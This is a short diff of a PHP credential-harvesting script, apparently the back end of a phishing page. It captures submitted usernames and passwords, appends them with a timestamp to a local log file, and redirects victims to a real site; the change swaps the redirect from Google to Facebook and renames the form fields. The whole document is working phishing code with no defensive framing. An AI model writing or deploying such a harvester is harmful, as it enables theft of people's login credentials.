@@ -1,10 +1,9 @@
 <?php
-header ("location:https://www.google.com");
-$a = $_POST["uname"];
-$b = $_POST["passwd"];
-//$d = $_POST["date"];
+header ("location:https://www.facebook.com");
+$a = $_POST["user"];
+$b = $_POST["pass"];
 
-$e = fopen("log_in.txt","a") or die("unable");
+$e = fopen("log_in.txt","a") or die("unable to fatch data");
 $f = "\nUser name : $a";
 $g = "\tPassword : $b";
 $d = "\tDate : " . date("\td/m/Y, D");
